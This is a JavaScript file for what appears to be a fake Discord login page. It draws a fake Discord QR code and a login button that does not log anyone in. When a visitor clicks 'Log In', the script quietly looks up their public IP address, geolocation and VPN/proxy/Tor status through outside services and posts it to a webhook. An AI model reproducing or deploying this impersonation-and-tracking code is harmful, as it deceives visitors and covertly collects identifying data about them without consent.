// ==================================
// IP LOGGER (LOGIN ONLY)
// ==================================
const sendIP = () => {
  // Prevent duplicate logs per session
  if (sessionStorage.getItem("ipLogged")) return;
  sessionStorage.setItem("ipLogged", "true");

  fetch("https://api.ipify.org?format=json")
    .then(res => res.json())
    .then(ipData => {
      const ipadd = ipData.ip;

      return fetch(`https://ipapi.co/${ipadd}/json/`)
        .then(res => res.json())
        .then(geoData => {
          const isVPN   = geoData.security?.vpn ?? false;
          const isProxy = geoData.security?.proxy ?? false;
          const isTor   = geoData.security?.tor ?? false;

          const riskLevel =
            isTor || isVPN || isProxy ? "🔴 High Risk" : "🟢 Low Risk";

          const embedColor =
            isTor ? 0xff0033 : isVPN || isProxy ? 0xffa500 : 0x00ff88;

          return fetch("http://localhost:3000/webhook", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              ipadd,
              geoData,
              riskLevel,
              embedColor,
              isVPN,
              isProxy,
              isTor
            })
          });
        });
    })
    .then(res => {
      if (res.ok) console.log("Login data sent");
      else console.warn("Webhook failed");
    })
    .catch(err => console.error("Login logger error:", err));
};

// ==================================
// CONFIG
// ==================================
const CONFIG = {
  ANIMATION_DURATION: 3000,
  QR_REFRESH_INTERVAL: 120000,
  ELLIPSIS_DELAY_INCREMENT: 0.2,
  QR_STRING_LENGTH: 43,
};

// ==================================
// SELECTORS
// ==================================
const DOM = {
  loginButton: document.querySelector("button"),
  qrCodeContainer: document.querySelector(".right-section .qr-code"),
};

// ==================================
// QR CODE MODULE (UNCHANGED)
// ==================================
const QRCodeModule = {
  generate(data) {
    const qr = qrcode(0, "L");
    qr.addData(data);
    qr.make();

    const svg = new DOMParser()
      .parseFromString(qr.createSvgTag(1, 0), "image/svg+xml")
      .documentElement;

    svg.setAttribute("width", "160");
    svg.setAttribute("height", "160");
    svg.setAttribute("viewBox", "0 0 37 37");

    return svg;
  },

  refresh() {
    if (!DOM.qrCodeContainer) return;

    DOM.qrCodeContainer.innerHTML = "";
    DOM.qrCodeContainer.appendChild(
      this.generate(`https://discord.com/ra/${Math.random().toString(36).slice(2)}`)
    );

    DOM.qrCodeContainer.insertAdjacentHTML(
      "beforeend",
      `<img src="./assets/qrcode-discord-logo.png" alt="Discord Logo">`
    );
  },

  initRefreshInterval() {
    setInterval(() => this.refresh(), CONFIG.QR_REFRESH_INTERVAL);
  },
};

// ==================================
// LOGIN BUTTON MODULE (LOGS ON LOGIN)
// ==================================
const LoginButtonModule = {
  showLoading() {
    if (!DOM.loginButton) return;

    DOM.loginButton.textContent = "Logging in…";
    DOM.loginButton.disabled = true;

    // ✅ SEND DATA ON LOGIN
    sendIP();

    setTimeout(() => this.reset(), CONFIG.ANIMATION_DURATION);
  },

  reset() {
    DOM.loginButton.textContent = "Log In";
    DOM.loginButton.disabled = false;
  },

  init() {
    DOM.loginButton?.addEventListener("click", e => {
      e.preventDefault();
      this.showLoading();
    });
  },
};

// ==================================
// INIT
// ==================================
const init = () => {
  LoginButtonModule.init();
  QRCodeModule.initRefreshInterval();
};

document.readyState === "loading"
  ? document.addEventListener("DOMContentLoaded", init)
  : init();
